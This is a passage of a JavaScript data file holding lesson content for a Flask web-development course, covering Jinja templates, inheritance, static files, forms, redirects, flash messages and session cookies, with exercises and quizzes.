/* ═══════════════════════════════════════════════════════════
   LESSON CONTENT — written after the first release. Merged onto
   the planned entries so titles and ordering stay in one place.
   ═══════════════════════════════════════════════════════════ */
const LESSON_CONTENT = {

/* ── Flask 07 ───────────────────────────────────────────── */
"flask:6": {
  blocks: [
    ['p', "You already loop and branch in `home.html`. Jinja has a second layer that turns templates from “HTML with holes” into something you can actually maintain."],
    ['h', "The loop object"],
    ['p', "Inside any `{% for %}`, Jinja hands you a free variable called `loop`:"],
    ['code', 'jinja', `{% for hobby in hobbies %}
  <li>{{ loop.index }}. {{ hobby }}</li>
{% endfor %}`],
    ['tbl',
      ["Attribute", "Is"],
      [
        ["`loop.index`", "position counting from **1**"],
        ["`loop.index0`", "position counting from 0"],
        ["`loop.first`", "`True` on the first pass"],
        ["`loop.last`", "`True` on the last pass"],
        ["`loop.length`", "total number of items"],
        ["`loop.revindex`", "position counting down to 1"]
      ]
    ],
    ['p', "`loop.last` is the one you reach for most — it is how you join items without a trailing comma:"],
    ['code', 'jinja', `{% for h in hobbies %}{{ h }}{% if not loop.last %}, {% endif %}{% endfor %}`],
    ['h', "for … else"],
    ['p', "Jinja gives `{% for %}` an `{% else %}` branch that runs when the collection is **empty**. It replaces the `{% if hobbies %}` wrapper you currently have:"],
    ['code', 'jinja', `<ul>
{% for hobby in hobbies %}
  <li>{{ hobby }}</li>
{% else %}
  <li>go to touch some grass</li>
{% endfor %}`],
    ['note', "This is not Python's `for/else`, which runs unless you `break`. Jinja's runs when there was nothing to iterate — much more useful in a template."],
    ['h', "set"],
    ['code', 'jinja', `{% set count = hobbies|length %}
<p>You listed {{ count }} things.</p>`],
    ['warn', "A `{% set %}` inside a `{% for %}` does not survive the loop — each pass gets its own scope. To accumulate across passes, compute the value in Python and pass it in. That is almost always the better answer anyway."],
    ['h', "Tests: the `is` keyword"],
    ['code', 'jinja', `{% if name is defined %}…{% endif %}
{% if hobbies is empty %}…{% endif %}
{% if count is divisibleby 3 %}…{% endif %}
{% if value is none %}…{% endif %}`],
    ['p', "A **filter** transforms (`name|upper`); a **test** asks a yes/no question (`name is defined`). Different jobs, different syntax."],
    ['h', "Macros — a function for markup"],
    ['p', "When the same fragment appears three times, define it once:"],
    ['code', 'jinja', `{% macro chip(label, tone="plain") %}
  <span class="chip chip--{{ tone }}">{{ label }}</span>
{% endmacro %}

{{ chip("coding") }}
{{ chip("urgent", "warn") }}`],
    ['p', "Macros take arguments and defaults exactly like Python functions. Put shared ones in `templates/macros.html` and pull them in with `{% import \"macros.html\" as ui %}`, then call `{{ ui.chip(\"coding\") }}`."],
    ['h', "Whitespace"],
    ['p', "A dash on either side of a tag eats the whitespace next to it. Use it when generated output matters — otherwise ignore it, because HTML collapses whitespace anyway:"],
    ['code', 'jinja', `{%- for h in hobbies -%}
  {{ h }}
{%- endfor -%}`]
  ],
  ex: [
    { q: "Number your hobbies list 1, 2, 3 using `loop`.",
      hint: "`loop.index` starts at 1; `loop.index0` starts at 0.",
      a: "Using `loop.index0` would start at zero, which reads oddly in a visible list.",
      code: ['jinja', `{% for hobby in hobbies %}
  <li>{{ loop.index }}. {{ hobby }}</li>
{% endfor %}`] },
    { q: "Replace the `{% if hobbies %}…{% else %}…{% endif %}` wrapper in `home.html` with a `{% for %}{% else %}`. Test it with the set empty and full.",
      a: "One construct instead of two, and the empty case sits right next to the loop it belongs to:",
      code: ['jinja', `<ul>
{% for hobby in hobbies %}
  <li>{{ hobby }}</li>
{% else %}
  <li>go to touch some grass</li>
{% endfor %}
</ul>`] },
    { q: "Render the hobbies on one line separated by commas, with no trailing comma. Do it without the `join` filter.",
      hint: "`loop.last` is true only on the final pass.",
      a: "`{{ hobbies|join(\", \") }}` is shorter and what you would normally use — but building it by hand is the clearest way to understand `loop.last`.",
      code: ['jinja', `{% for h in hobbies %}{{ h }}{% if not loop.last %}, {% endif %}{% endfor %}`] },
    { q: "Give the first item a `class=\"first\"` and the last a `class=\"last\"`. What happens when the list has exactly one item?",
      hint: "Both flags can be true at once.",
      a: "With one item, `loop.first` and `loop.last` are **both** true, so it gets both classes. That is usually what you want — but it is worth knowing before it surprises you in CSS.",
      code: ['jinja', `{% for h in hobbies %}
  <li class="{% if loop.first %}first{% endif %} {% if loop.last %}last{% endif %}">{{ h }}</li>
{% endfor %}`] },
    { q: "Write a `badge(text, tone)` macro with `tone` defaulting to `\"plain\"`, then call it twice with different tones.",
      hint: "Macro arguments work like Python's.",
      a: "Once it is in `macros.html` and imported, every template can call it — this is how you stop copying the same `<span>` into six files.",
      code: ['jinja', `{% macro badge(text, tone="plain") %}
  <span class="badge badge--{{ tone }}">{{ text }}</span>
{% endmacro %}

{{ badge("coding") }}
{{ badge("overdue", "danger") }}`] }
  ],
  quiz: [
    { q: "What is `loop.index` on the first pass of a `{% for %}`?",
      opts: ["0", "1", "The item itself", "It does not exist"], correct: 1,
      why: "`loop.index` counts from 1; `loop.index0` counts from 0." },
    { q: "When does Jinja's `{% for %}{% else %}` branch run?",
      opts: ["When the loop finishes without a break", "When the collection is empty", "On the last pass", "Never — Jinja has no for/else"], correct: 1,
      why: "Unlike Python's for/else, Jinja's runs when there was nothing to iterate — which is exactly the case templates care about." },
    { q: "What is the difference between `name|upper` and `name is defined`?",
      opts: ["None, both are filters", "A filter transforms a value; a test asks a yes/no question", "`is` only works on strings", "`|` only works inside {% %}"], correct: 1,
      why: "Filters pipe a value through a transformation. Tests return true or false for use in a condition." },
    { q: "A `{% set total = total + 1 %}` inside a `{% for %}` does not accumulate. Why?",
      opts: ["Jinja has no arithmetic", "Each loop pass gets its own scope", "`set` only works with strings", "You need `{% endset %}`"], correct: 1,
      why: "Loop bodies are scoped, so the assignment does not escape the pass. Compute it in Python and pass it in instead." }
  ],
  fill: [
    { prompt: "Number the list starting at one.", lang: 'jinja',
      code: '<li>{{ loop.___ }}. {{ hobby }}</li>', opts: ["index0", "index", "count", "number"], correct: 1,
      why: "`index` counts from 1, `index0` from 0." },
    { prompt: "Add a separator between items but not after the last.", lang: 'jinja',
      code: '{% if not loop.___ %}, {% endif %}', opts: ["end", "final", "last", "tail"], correct: 2,
      why: "`loop.last` is true only on the final pass." },
    { prompt: "Define a reusable markup fragment.", lang: 'jinja',
      code: '{% ___ chip(label) %}\n  <span>{{ label }}</span>\n{% endmacro %}', opts: ["def", "macro", "block", "func"], correct: 1,
      why: "`{% macro %}` is Jinja's function. It takes arguments and defaults like Python's." }
  ]
},

/* ── Flask 08 ───────────────────────────────────────────── */
"flask:7": {
  blocks: [
    ['p', "Right now `home.html` carries its own `<html>`, `<head>` and `<title>`. Add a second page and you copy all of it. Add a nav bar later and you edit every file. Inheritance fixes that permanently."],
    ['h', "The parent"],
    ['p', "`base.html` holds the shell and marks the holes with `{% block %}`:"],
    ['code', 'jinja', `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>{% block title %}My Flask app{% endblock %}</title>
</head>
<body>
  <nav><a href="{{ url_for('home') }}">home</a></nav>
  <main>
    {% block content %}{% endblock %}
  </main>
</body>
</html>`],
    ['h', "The child"],
    ['code', 'jinja', `{% extends "base.html" %}

{% block title %}Home{% endblock %}

{% block content %}
  <h1>Hello, {{ name }}</h1>
{% endblock %}`],
    ['warn', "`{% extends %}` must be the **first** tag in the file. Anything outside a `{% block %}` in a child template is discarded — if your markup vanishes, that is why."],
    ['h', "Default content"],
    ['p', "Whatever sits between `{% block %}` and `{% endblock %}` in the parent is the default. A child that does not override the block gets it. That makes `{% block title %}My Flask app{% endblock %}` a sensible fallback title for every page."],
    ['h', "super() — add instead of replace"],
    ['code', 'jinja', `{% block title %}{{ super() }} · Home{% endblock %}`],
    ['p', "Renders “My Flask app · Home”. Without `super()` the parent's content is thrown away."],
    ['h', "include — a different tool"],
    ['tbl',
      ["", "`{% extends %}`", "`{% include %}`"],
      [
        ["Direction", "child fills the parent's holes", "pulls a fragment into this spot"],
        ["How many", "one parent per template", "as many as you like"],
        ["Use for", "the page shell", "a card, a nav, a form field"]
      ]
    ],
    ['code', 'jinja', `{% include "partials/flash.html" %}`],
    ['note', "Rule of thumb: **extends** for the skeleton, **include** for repeated chunks, **macro** when the chunk needs arguments."],
    ['h', "A layout that scales"],
    ['code', 'text', `templates/
  base.html
  home.html
  about.html
  partials/
    nav.html
    flash.html
  macros.html`]
  ],
  ex: [
    { q: "Create `templates/base.html` with `title` and `content` blocks, then rewrite `home.html` to extend it.",
      hint: "`{% extends %}` goes on line one.",
      a: "Load `/` — it should look identical. The win is invisible now and enormous on the third page.",
      code: ['jinja', `{% extends "base.html" %}
{% block title %}Home{% endblock %}
{% block content %}
  <h1>Hello, {{ name }}</h1>
{% endblock %}`] },
    { q: "Put some markup in `home.html` **outside** any block — above `{% extends %}` and below it. What renders?",
      hint: "Children only supply blocks.",
      a: "Content above `{% extends %}` raises `TemplateSyntaxError`; content below it but outside a block is silently dropped. Silent dropping is the one that wastes an afternoon, so recognise it early." },
    { q: "Make the home page title read “My Flask app · Home” using `super()`.",
      a: "`super()` inserts the parent block's content, so you extend rather than replace:",
      code: ['jinja', `{% block title %}{{ super() }} · Home{% endblock %}`] },
    { q: "Convert `/about` to return a template that also extends `base.html`, instead of a plain string.",
      hint: "It currently returns `\"They not really care about us\"`.",
      a: "Both pages now share one nav and one `<head>`. Change either in `base.html` and both follow.",
      code: ['python', `@app.route("/about")
def about():
    return render_template("about.html")`] },
    { q: "You have a flash-message block that should appear on every page. Should it be `extends`, `include`, or a macro?",
      a: "**include**, placed once inside `base.html` above `{% block content %}`. It is the same markup everywhere and takes no arguments, so a macro would be overkill and `extends` is the wrong direction entirely — `base.html` is the parent, not a child." }
  ],
  quiz: [
    { q: "Where must `{% extends %}` appear in a child template?",
      opts: ["Anywhere", "As the first tag in the file", "Inside a block", "At the bottom"], correct: 1,
      why: "It must come first. Anything before it is a TemplateSyntaxError." },
    { q: "You put a `<p>` in a child template outside every block. What renders?",
      opts: ["It appears at the top", "It appears at the bottom", "Nothing — it is discarded", "TemplateSyntaxError"], correct: 2,
      why: "A child only supplies block content. Everything else is dropped silently, which makes it a confusing bug." },
    { q: "What does `{{ super() }}` do inside a block?",
      opts: ["Calls the view function", "Inserts the parent block's content", "Skips the block", "Imports a macro"], correct: 1,
      why: "It lets you add to the parent's content rather than replacing it." },
    { q: "Same markup needed on six pages, with no arguments. Which tool?",
      opts: ["`{% extends %}`", "`{% include %}`", "`{% macro %}`", "Copy and paste"], correct: 1,
      why: "extends is for the page shell; macro is for fragments that take arguments; include is exactly the no-argument repeated chunk." }
  ],
  fill: [
    { prompt: "Inherit the site shell.", lang: 'jinja',
      code: '{% ___ "base.html" %}', opts: ["include", "import", "extends", "inherit"], correct: 2,
      why: "`extends` names the parent whose blocks this template fills." },
    { prompt: "Mark a hole a child can fill.", lang: 'jinja',
      code: '{% ___ content %}{% endblock %}', opts: ["block", "slot", "hole", "section"], correct: 0,
      why: "`{% block name %}` defines it; the child overrides it by name." },
    { prompt: "Keep the parent's title and add to it.", lang: 'jinja',
      code: '{% block title %}{{ ___() }} · Home{% endblock %}', opts: ["parent", "super", "base", "extend"], correct: 1,
      why: "`super()` renders the parent block's content in place." }
  ]
},

/* ── Flask 09 ───────────────────────────────────────────── */
"flask:8": {
  blocks: [
    ['p', "Your `learn/static/` folder is empty. Filling it is what connects the CSS track to the Flask track — everything you learn about selectors and the box model lands here."],
    ['h', "The folder Flask already knows about"],
    ['p', "You saw this in lesson 03: `flask routes` lists a `static` rule you never wrote. Flask registers it when you construct the app, mapping `/static/<path:filename>` to a folder called `static/` next to `hello.py`."],
    ['code', 'text', `learn/
  hello.py
  static/
    css/style.css
    js/app.js
    img/logo.png
  templates/
    base.html`],
    ['p', "Drop a file in and it is served. No route, no view function."],
    ['h', "Linking to it"],
    ['code', 'jinja', `<link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
<script src="{{ url_for('static', filename='js/app.js') }}" defer><\/script>
<img src="{{ url_for('static', filename='img/logo.png') }}" alt="Logo">`],
    ['p', "`static` is the endpoint name; `filename` is the path **inside** the folder, always with forward slashes even on Windows."],
    ['warn', "Hardcoding `/static/css/style.css` works today and breaks the moment the app is mounted under a prefix like `/myapp`. `url_for` costs nothing and never rots."],
    ['h', "The caching trap"],
    ['p', "Browsers cache static files hard. You edit `style.css`, reload, and see the old one — the single most common “why isn't my CSS working” cause. `Ctrl+Shift+R` forces a fresh fetch."],
    ['p', "For a real deployment you make the URL change whenever the file does, so the browser is forced to refetch:"],
    ['code', 'python', `import os

@app.context_processor
def cache_buster():
    def static_v(filename):
        path = os.path.join(app.static_folder, filename)
        stamp = int(os.path.getmtime(path))
        return url_for("static", filename=filename, v=stamp)
    return dict(static_v=static_v)`],
    ['code', 'jinja', `<link rel="stylesheet" href="{{ static_v('css/style.css') }}">`],
    ['note', "That uses `os.path.join` and `os.path.getmtime` from your `os` track, plus `@app.context_processor` to make the helper available in every template. Two tracks meeting in six lines."],
    ['h', "What belongs here"],
    ['ul', [
      "**Yes** — your CSS, your JavaScript, logos, icons, fonts.",
      "**No** — anything user-uploaded (that needs validation and its own folder), and anything secret. Every file in `static/` is public to anyone who guesses the URL."
    ]]
  ],
  ex: [
    { q: "Create `static/css/style.css`, give `body` a background colour, and link it from `base.html` with `url_for`. Verify it loads.",
      hint: "Devtools → Network shows a 404 if the path is wrong.",
      a: "A `404` for `style.css` means the file is not where Flask expects. A `200` with no visual change means your selector is the problem, not the wiring.",
      code: ['jinja', `<link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">`] },
    { q: "Print `url_for('static', filename='css/style.css')` from a route. What exact string comes back?",
      a: "`/static/css/style.css`. Seeing it as a plain string makes clear that `url_for` is just building a path from the URL map — there is no magic." },
    { q: "Change your CSS, reload normally, then hard-reload. Describe the difference.",
      hint: "Ctrl+Shift+R.",
      a: "A normal reload may serve the cached file and show no change; the hard reload bypasses the cache. Devtools → Network shows `(from disk cache)` next to the cached one — worth recognising, because it looks identical to “my CSS is broken”." },
    { q: "Add a `static/js/app.js` that logs to the console, and load it with `defer`. Why `defer` rather than plain?",
      hint: "Lesson 01 of the JavaScript track.",
      a: "`defer` waits until the HTML is parsed before running, so `document.querySelector` can actually find your elements. Without it, a script in `<head>` runs against a page that does not exist yet.",
      code: ['jinja', `<script src="{{ url_for('static', filename='js/app.js') }}" defer><\/script>`] },
    { q: "Someone puts `config.py` containing a database password inside `static/`. What is the consequence?",
      a: "It is downloadable by anyone who requests `/static/config.py` — no authentication, no route needed, because Flask serves that whole folder verbatim. Secrets belong in environment variables, and `static/` should contain nothing you would mind a stranger reading." }
  ],
  quiz: [
    { q: "How many routes must you write to serve `static/css/style.css`?",
      opts: ["One per file", "One for the folder", "None — Flask registers the static route itself", "Two: one GET, one HEAD"], correct: 2,
      why: "The `static` rule is created when you construct the app, mapping `/static/<path:filename>`." },
    { q: "Why `url_for('static', filename=...)` over a hardcoded `/static/...`?",
      opts: ["It is faster", "It survives the app being mounted under a URL prefix", "It compresses the file", "Flask rejects hardcoded paths"], correct: 1,
      why: "A hardcoded path 404s the moment the app moves. url_for rebuilds from the live URL map." },
    { q: "You edited style.css but the page looks identical. Most likely cause?",
      opts: ["Flask needs restarting", "The browser served a cached copy", "url_for is broken", "CSS requires a build step"], correct: 1,
      why: "Hard-reload with Ctrl+Shift+R. Devtools Network shows '(from disk cache)' when this is happening." },
    { q: "Is it safe to keep a file with an API key inside `static/`?",
      opts: ["Yes, Flask blocks unknown files", "Yes, if it has no route", "No — anything in static/ is publicly downloadable", "Only if named with a leading dot"], correct: 2,
      why: "Flask serves that folder verbatim to anyone who requests the path. Secrets belong in os.environ." }
  ],
  fill: [
    { prompt: "Build the URL for a stylesheet.", lang: 'jinja',
      code: "href=\"{{ url_for('___', filename='css/style.css') }}\"", opts: ["css", "assets", "static", "files"], correct: 2,
      why: "`static` is the endpoint name Flask registers automatically." },
    { prompt: "Name the path inside the static folder.", lang: 'jinja',
      code: "{{ url_for('static', ___='js/app.js') }}", opts: ["path", "file", "filename", "src"], correct: 2,
      why: "`filename` is relative to `static/`, always with forward slashes." },
    { prompt: "Run the script only after the HTML is parsed.", lang: 'html',
      code: '<script ___ src="/static/js/app.js"><\/script>', opts: ["async", "defer", "onload", "module"], correct: 1,
      why: "`defer` waits for parsing, so your selectors find the elements they target." }
  ]
},

/* ── Flask 10 ───────────────────────────────────────────── */
"flask:9": {
  blocks: [
    ['p', "Query strings let people send data by editing the URL. Forms let them type into the page. The mechanics are nearly identical — one dict instead of another — but the *method* changes, and that difference matters."],
    ['h', "GET and POST"],
    ['tbl',
      ["", "GET", "POST"],
      [
        ["Data travels in", "the URL", "the request body"],
        ["Visible in the address bar", "yes", "no"],
        ["Bookmarkable", "yes", "no"],
        ["Safe to repeat", "yes", "**no** — reload resubmits"],
        ["Read it with", "`request.args`", "`request.form`"],
        ["Use for", "searching, filtering, paging", "creating, changing, deleting"]
      ]
    ],
    ['p', "The rule: **GET reads, POST changes.** A route that alters something must not be reachable by GET, or a search engine crawling your links will delete your data."],
    ['h', "Accepting both on one route"],
    ['code', 'python', `from flask import request, render_template

@app.route("/greet", methods=["GET", "POST"])
def greet():
    if request.method == "POST":
        name = request.form.get("name", "").strip()
        if not name:
            return render_template("greet.html", error="Please enter a name.")
        return "shalom " + name
    return render_template("greet.html")`],
    ['warn', "A route accepts **GET only** unless you say otherwise. POST to a route without `methods=[\"POST\"]` gives `405 Method Not Allowed` — a very common first error here."],
    ['h', "The form itself"],
    ['code', 'jinja', `<form method="post" action="{{ url_for('greet') }}">
  <label for="name">Your name</label>
  <input id="name" name="name" required>
  <button type="submit">Say hello</button>
</form>`],
    ['note', "The `name` attribute is the dictionary key — `name=\"name\"` is what makes `request.form[\"name\"]` work. An input without `name` is never sent at all. This is the single most common reason a field arrives empty."],
    ['h', "Reading it safely"],
    ['code', 'python', `request.form.get("name", "")          # missing -> ""
request.form.get("age", 0, type=int)  # same type= as request.args
request.form.getlist("tag")           # repeated fields
request.values.get("q")               # args and form together`],
    ['h', "POST / Redirect / GET"],
    ['p', "If a POST returns HTML directly, the browser's reload button resubmits the form — a second identical record. Redirect instead, so the final page is a plain GET:"],
    ['code', 'python', `from flask import redirect, url_for

@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title", "").strip()
    if title:
        tasks.append(title)
    return redirect(url_for("index"))`],
    ['p', "This pattern is in your `app.py` already — `add`, `toggle` and `delete` all end with `redirect(url_for(\"index\"))`. Now you know why."],
    ['warn', "Never trust what arrives. `strip()` it, check it is not empty, check its type, and check the user is allowed to do it. The browser's `required` attribute is a convenience for honest users, not a security control — anyone can send a request without it."]
  ],
  ex: [
    { q: "Build `/greet` accepting GET and POST: GET shows a form, POST returns “shalom NAME”. Submit it.",
      hint: "One route, `request.method` to branch.",
      a: "Notice the URL does not change and the name is not in the address bar — that is the POST body at work.",
      code: ['python', `@app.route("/greet", methods=["GET", "POST"])
def greet():
    if request.method == "POST":
        return "shalom " + request.form.get("name", "stranger")
    return render_template("greet.html")`] },
    { q: "Remove `methods=[\"GET\", \"POST\"]` and submit the form again. What status code appears?",
      a: "`405 Method Not Allowed`. The route exists — that is why it is not a 404 — but it does not accept POST. Recognising 405 as “wrong verb, right URL” saves real time." },
    { q: "Delete the `name` attribute from the `<input>` and submit. What does `request.form.get(\"name\", \"stranger\")` return, and why?",
      hint: "What does the browser actually send?",
      a: "`\"stranger\"` — the default. A field with no `name` is not included in the submission at all, so the key never arrives. The input still looks and behaves normally on screen, which is what makes this bug so confusing." },
    { q: "Make the POST branch redirect to `/` instead of returning text. Then submit and press reload. Compare with the non-redirect version.",
      hint: "POST/Redirect/GET.",
      a: "Without the redirect, reloading prompts to resubmit and duplicates the action. With it, the final page came from a GET, so reload is harmless. This is why every write route in your `app.py` ends with a redirect.",
      code: ['python', `return redirect(url_for("home"))`] },
    { q: "Your form has `required` on the input. Explain why the server must still check for an empty value.",
      a: "`required` is enforced by the browser only. A request can be sent with curl, from a script, or from a browser with JavaScript disabled — none of which honour it. Client-side validation is for fast feedback; the server is the only place that can actually enforce anything. Validate in both." }
  ],
  quiz: [
    { q: "Which dictionary holds data from a POSTed form?",
      opts: ["`request.args`", "`request.form`", "`request.data`", "`request.query`"], correct: 1,
      why: "`args` is the query string; `form` is the request body. `request.values` covers both." },
    { q: "You POST to a route declared as `@app.route(\"/add\")`. What happens?",
      opts: ["It works", "404 Not Found", "405 Method Not Allowed", "500 error"], correct: 2,
      why: "Routes accept GET only by default. 405 means right URL, wrong verb." },
    { q: "An `<input>` with no `name` attribute is submitted. What does the server receive?",
      opts: ["An empty string", "None", "Nothing — the field is not sent at all", "The input's id instead"], correct: 2,
      why: "`name` is the dictionary key. Without it the browser omits the field entirely." },
    { q: "Why redirect after a successful POST?",
      opts: ["It is faster", "So reloading does not resubmit the form", "POST cannot return HTML", "To clear the session"], correct: 1,
      why: "POST/Redirect/GET leaves the browser on a plain GET, so refresh is harmless." }
  ],
  fill: [
    { prompt: "Let this route accept a form submission.", lang: 'python',
      code: '@app.route("/greet", ___=["GET", "POST"])', opts: ["verbs", "methods", "accept", "http"], correct: 1,
      why: "Without it a route is GET-only and POSTing gives 405." },
    { prompt: "Read a submitted field safely.", lang: 'python',
      code: 'name = request.___.get("name", "")', opts: ["args", "form", "json", "data"], correct: 1,
      why: "`form` is the POST body; `args` is the query string." },
    { prompt: "Finish a write route so reload cannot resubmit.", lang: 'python',
      code: 'return ___(url_for("index"))', opts: ["render_template", "redirect", "abort", "jsonify"], correct: 1,
      why: "POST/Redirect/GET — the browser ends on a GET." }
  ]
},

/* ── Flask 11 ───────────────────────────────────────────── */
"flask:10": {
  blocks: [
    ['p', "Two small pieces that always travel together: sending someone to a different URL, and leaving them a note about what just happened."],
    ['h', "redirect"],
    ['code', 'python', `from flask import redirect, url_for

return redirect(url_for("home"))
return redirect(url_for("user_name", name="itay"))
return redirect("https://flask.palletsprojects.com")`],
    ['p', "`redirect()` returns a response whose status is 3xx and whose `Location` header is the new URL. The browser then makes a **second** request. You will see both in the terminal:"],
    ['code', 'shell', `"POST /add HTTP/1.1" 302 -
"GET / HTTP/1.1" 200 -`],
    ['h', "Which 3xx"],
    ['tbl',
      ["Code", "Means", "When"],
      [
        ["`302 Found`", "temporary", "the default, and what you want after a POST"],
        ["`301 Moved Permanently`", "permanent", "a URL that has genuinely changed for good"],
        ["`307` / `308`", "temporary / permanent, **method preserved**", "when a POST must stay a POST"]
      ]
    ],
    ['warn', "`301` is cached by browsers, sometimes for months. Send one by mistake during development and that URL keeps redirecting even after you fix the code. Stick to the default `302` unless you are certain."],
    ['h', "flash"],
    ['p', "After a redirect you are on a new request — local variables are gone. `flash()` stores a message in the session so the *next* request can display it once, then it disappears."],
    ['code', 'python', `from flask import flash, redirect, url_for

@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title", "").strip()
    if not title:
        flash("Title cannot be empty.", "error")
        return redirect(url_for("index"))

    tasks.append(title)
    flash("Added: " + title, "success")
    return redirect(url_for("index"))`],
    ['h', "Showing them"],
    ['p', "Put this once in `base.html` and every page inherits it:"],
    ['code', 'jinja', `{% with messages = get_flashed_messages(with_categories=true) %}
  {% if messages %}
    <ul class="flashes">
      {% for category, message in messages %}
        <li class="flash flash--{{ category }}">{{ message }}</li>
      {% endfor %}
    </ul>
  {% endif %}
{% endwith %}`],
    ['note', "`get_flashed_messages()` **empties** the queue as it reads. Call it twice and the second call returns nothing — which is exactly why it belongs in `base.html` once, not in each template."],
    ['h', "It needs a secret key"],
    ['code', 'python', `app.secret_key = os.environ.get("SECRET_KEY", "dev-only-change-me")`],
    ['p', "Flashes live in the session, and the session is a signed cookie. Without `secret_key` you get `RuntimeError: The session is unavailable because no secret key was set`. Your `app.py` sets it — the next lesson explains what the signing actually protects."],
    ['h', "The second category argument"],
    ['p', "`flash(msg, \"error\")` tags the message so CSS can style it. The category is a free string — `success`, `error`, `warning`, whatever you agree with your stylesheet."]
  ],
  ex: [
    { q: "Add `/old` that permanently sends visitors to `/about`, and `/temp` that temporarily sends them to `/`. Watch the terminal for both.",
      hint: "`redirect(url, code=301)`.",
      a: "You will see two log lines per visit: the redirect, then the GET of the destination. Note the codes differ — 301 vs 302.",
      code: ['python', `@app.route("/old")
def old():
    return redirect(url_for("about"), code=301)

@app.route("/temp")
def temp():
    return redirect(url_for("home"))`] },
    { q: "Why is a stray `301` during development worse than a stray `302`?",
      a: "Browsers cache 301s aggressively — often for months, and it survives a normal reload. After you fix the route the browser keeps redirecting anyway, and you end up debugging code that is already correct. Clearing site data fixes it, but the lesson is to default to 302." },
    { q: "Add `flash()` to your `/greet` POST branch for both the empty and the valid case, then render the messages in `base.html`.",
      hint: "`get_flashed_messages(with_categories=true)` yields `(category, message)` pairs.",
      a: "The message survives the redirect because it is stored in the session, not in a variable:",
      code: ['python', `if not name:
    flash("Please enter a name.", "error")
    return redirect(url_for("greet"))

flash("Hello, " + name, "success")
return redirect(url_for("home"))`] },
    { q: "Call `get_flashed_messages()` twice in the same template. What does the second call return?",
      hint: "Reading is destructive.",
      a: "An empty list. The queue is consumed on first read, which is the mechanism that makes flashes show exactly once. It also means putting the loop in two templates gives you a message that sometimes vanishes — put it in `base.html` alone." },
    { q: "Remove `app.secret_key` and trigger a flash. What error appears, and why does a flash need a key at all?",
      a: "`RuntimeError: The session is unavailable because no secret key was set.` Flashes are stored in the session, which Flask keeps in a **signed** cookie on the visitor's browser. The key is what produces the signature, so without it Flask cannot create a session at all." }
  ],
  quiz: [
    { q: "How many requests does the browser make when a POST returns `redirect(url_for('index'))`?",
      opts: ["One", "Two — the POST, then a GET of the destination", "Three", "None, it is server-side"], correct: 1,
      why: "redirect() sends a 3xx with a Location header; the browser then requests that URL. Both appear in the terminal log." },
    { q: "Which redirect code should you default to?",
      opts: ["301", "302", "307", "404"], correct: 1,
      why: "302 is temporary and not cached. A stray 301 is cached for months and keeps redirecting after you fix the code." },
    { q: "What does `get_flashed_messages()` do to the queue?",
      opts: ["Leaves it intact", "Empties it as it reads", "Doubles it", "Writes it to disk"], correct: 1,
      why: "Reading is destructive — that is what makes a flash appear exactly once. Call it in base.html only." },
    { q: "Why does `flash()` require `app.secret_key`?",
      opts: ["To encrypt the message text", "Flashes are stored in the session, which is a signed cookie", "To pick a random category", "It does not"], correct: 1,
      why: "No key, no session, no flash — you get a RuntimeError." }
  ],
  fill: [
    { prompt: "Send the visitor to another route.", lang: 'python',
      code: 'return ___(url_for("home"))', opts: ["goto", "redirect", "forward", "render_template"], correct: 1,
      why: "It returns a 3xx response with a Location header." },
    { prompt: "Leave a one-time note that survives the redirect.", lang: 'python',
      code: '___("Added: " + title, "success")', opts: ["print", "log", "flash", "notify"], correct: 2,
      why: "flash() stores it in the session for the next request only." },
    { prompt: "Read the messages with their categories.", lang: 'jinja',
      code: '{% set msgs = get_flashed_messages(___=true) %}', opts: ["categories", "with_categories", "tagged", "grouped"], correct: 1,
      why: "It changes each entry from a string to a (category, message) pair." }
  ]
},

/* ── Flask 12 ───────────────────────────────────────────── */
"flask:11": {
  blocks: [
    ['p', "HTTP has no memory. Every request arrives as though it were the first — same server, no idea it has spoken to this browser before. Sessions are how “logged in as itay” survives from one request to the next."],
    ['h', "What a cookie is"],
    ['p', "A small named string the server asks the browser to store and send back on every subsequent request to that site. That is the whole mechanism. Everything else is built on it."],
    ['code', 'shell', `# response
Set-Cookie: session=eyJ1c2VyIjoiaXRheSJ9.ZaBc.9xK...; HttpOnly; Path=/

# every request after that
Cookie: session=eyJ1c2VyIjoiaXRheSJ9.ZaBc.9xK...`],
    ['h', "Flask's session"],
    ['code', 'python', `from flask import session

session["user"] = "itay"          # write
session.get("user")               # read, None if absent
session.pop("user", None)         # remove
"user" in session                 # test
session.clear()                   # remove everything`],
    ['p', "It behaves like a dict, but it is stored **in the cookie itself**, signed with `app.secret_key`."],
    ['h', "Signed is not encrypted"],
    ['warn', "This is the single most misunderstood thing about Flask sessions. The contents are base64-encoded, **not** encrypted — anyone can decode and read them. The signature only proves they have not been *changed*."],
    ['code', 'python', `# Anyone can do this with the cookie from their own browser:
import base64
base64.urlsafe_b64decode("eyJ1c2VyIjoiaXRheSJ9" + "==")
# b'{"user":"itay"}'`],
    ['p', "So: put a user **id** in the session. Never a password, a card number, or an is_admin flag you would mind someone reading."],
    ['h', "The secret key"],
    ['code', 'python', `import os
app.secret_key = os.environ["SECRET_KEY"]`],
    ['p', "Anyone holding the key can forge a session that Flask will trust completely — they can sign a cookie saying they are anyone. Generate a real one with `python -c \"import secrets; print(secrets.token_hex(32))\"`, keep it in the environment, and never commit it."],
    ['note', "Changing the key invalidates every existing session, logging everyone out. That is also your emergency lever if a key ever leaks."],
    ['h', "Cookie flags worth knowing"],
    ['tbl',
      ["Flag", "Does"],
      [
        ["`HttpOnly`", "JavaScript cannot read it — blocks cookie theft via XSS. Flask sets this by default."],
        ["`Secure`", "Only sent over HTTPS. Set it in production."],
        ["`SameSite=Lax`", "Not sent on cross-site POSTs — mitigates CSRF. Flask's default."],
        ["`Max-Age`", "How long it survives. Without it the cookie dies when the browser closes."]
      ]
    ],
    ['code', 'python', `app.config.update(
    SESSION_COOKIE_SECURE=True,      # production only — needs HTTPS
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
)`],
    ['h', "When a cookie is not enough"],
    ['p', "Cookies cap at about 4KB and travel on every single request. Once you need more than a user id and a couple of flags, move to server-side sessions (Flask-Session with Redis or a database) and keep only the session id in the cookie."]
  ],
  ex: [
    { q: "Write `/login` (POST, stores a name in the session), `/whoami` (reports it) and `/logout` (clears it). Visit `/whoami` before and after logging in.",
      hint: "`session` behaves like a dict.",
